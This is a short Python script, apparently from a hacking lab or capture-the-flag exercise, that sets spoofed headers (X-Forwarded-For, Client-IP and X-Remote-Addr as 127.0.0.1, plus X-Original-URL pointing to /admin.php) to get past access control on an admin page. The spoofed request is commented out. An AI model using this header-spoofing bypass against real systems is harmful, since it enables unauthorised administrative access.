import requests

url = "http://web-q3-cs30401r.darklabhackaday.com:8080/"

# X-Forwarded-For: 127.0.0.1
# X-Original-URL: /admin.php
# Client-IP: 127.0.0.1
# X-Remote-Addr: 127.0.0.1
headers = {
    "X-Forwarded-For": "127.0.0.1",
    "X-Original-URL": "/admin.php",
    "Client-IP": "127.0.0.1",
    "X-Remote-Addr": "127.0.0.1",
}

# response = requests.get(url, headers=headers)

# print(response.text)

# Make post request to /admin.php
response = requests.post(url + "logout.php")

print(response.text)
